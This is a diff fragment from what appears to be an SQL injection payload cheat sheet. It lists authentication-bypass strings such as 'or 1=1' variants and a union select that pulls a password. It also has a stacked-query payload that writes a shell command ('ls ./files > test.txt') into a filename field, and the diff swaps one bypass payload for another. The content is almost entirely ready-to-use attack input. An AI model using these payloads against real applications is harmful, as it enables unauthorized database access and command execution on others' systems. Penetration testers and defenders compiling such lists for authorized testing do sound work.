@@ -49,7 +49,7 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 1') or 1=1-- -
 1' or 1=1-- -%00
 ' or '1'='1
-'; --
+1' or 1=1;-- -
 ' union select "pass" as password from <db_name> where '1'='1
 ```
 ### Parameter Testing For Time Based Blind
